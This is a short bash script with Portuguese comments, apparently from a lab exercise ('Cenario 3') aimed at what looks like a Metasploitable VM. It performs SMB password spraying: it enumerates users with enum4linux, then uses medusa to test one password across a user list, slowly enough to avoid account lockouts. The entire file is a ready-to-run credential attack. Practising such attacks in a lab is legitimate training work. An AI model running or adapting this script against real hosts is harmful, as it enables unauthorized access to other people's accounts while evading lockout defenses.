#!/usr/bin/env bash
# Cenario 3 - password spraying no SMB.
# Testa uma senha so contra varios usuarios, pra nao estourar bloqueio.
# Uso: ./ataque_smb.sh [ip_do_alvo] [senha]

set -euo pipefail

ALVO="${1:-192.168.56.102}"
SENHA="${2:-msfadmin}"

echo "[*] Enumerando usuarios SMB em ${ALVO}..."
enum4linux -U "${ALVO}" || true

echo "[*] Testando a senha '${SENHA}' nos usuarios da lista..."
medusa -h "${ALVO}" \
       -U wordlists/users.txt \
       -p "${SENHA}" \
       -M smbnt \
       -t 1 \
       -O images/smb_resultado.txt

echo "[+] Pronto. Olha o resultado em images/smb_resultado.txt"
